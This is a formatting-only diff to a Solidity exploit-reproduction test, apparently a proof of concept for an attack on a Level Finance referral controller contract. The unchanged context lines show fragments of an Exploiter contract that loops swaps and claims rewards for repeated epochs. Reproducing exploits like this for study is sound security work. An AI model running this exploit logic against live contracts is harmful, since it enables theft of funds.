@@ -33,10 +33,14 @@ interface ILevelReferralControllerV2 {
 
     function claim(uint256 _epoch, address _to) external;
     function claimMultiple(uint256[] calldata _epoches, address _to) external;
-    function setReferrer(address _referrer) external;
+    function setReferrer(
+        address _referrer
+    ) external;
     function currentEpoch() external view returns (uint256);
     function claimable(uint256 _epoch, address _user) external view returns (uint256);
-    function setEnableNextEpoch(bool _enable) external;
+    function setEnableNextEpoch(
+        bool _enable
+    ) external;
     function nextEpoch() external;
 }
 
@@ -119,7 +123,9 @@ contract ContractTest is Test {
         exploiter.claim(tokenID);
     }
 
-    function claimReward(uint256 amount) internal {
+    function claimReward(
+        uint256 amount
+    ) internal {
         uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
         uint256[] memory _epoches = new uint256[](amount);
         for (uint256 i; i < amount; i++) {
@@ -138,11 +144,15 @@ contract Exploiter {
     ILevelReferralControllerV2 LevelReferralControllerV2 =
         ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
 
-    constructor(address _referrer) {
+    constructor(
+        address _referrer
+    ) {
         LevelReferralControllerV2.setReferrer(_referrer);
     }
 
-    function swap(uint256 amount) external {
+    function swap(
+        uint256 amount
+    ) external {
         for (uint256 i; i < amount; i++) {
             WBNB.transfer(address(pool), WBNB.balanceOf(address(this)));
             pool.swap(address(WBNB), address(USDT), 1, address(this), abi.encode(address(msg.sender)));
@@ -152,11 +162,15 @@ contract Exploiter {
         WBNB.transfer(msg.sender, WBNB.balanceOf(address(this)));
     }
 
-    function claim(uint256 tokenId) external {
+    function claim(
+        uint256 tokenId
+    ) external {
         LevelReferralControllerV2.claim(tokenId, msg.sender);
     }
 
-    function claimMultiple(uint256 amount) external {
+    function claimMultiple(
+        uint256 amount
+    ) external {
         uint256 tokenID = LevelReferralControllerV2.currentEpoch() - 1;
         uint256[] memory _epoches = new uint256[](amount);
         for (uint256 i; i < amount; i++) {
@@ -170,7 +184,9 @@ contract Referral {
     ILevelReferralControllerV2 LevelReferralControllerV2 =
         ILevelReferralControllerV2(0x977087422C008233615b572fBC3F209Ed300063a);
 
-    constructor(address _referrer) {
+    constructor(
+        address _referrer
+    ) {
         LevelReferralControllerV2.setReferrer(_referrer);
     }
 }
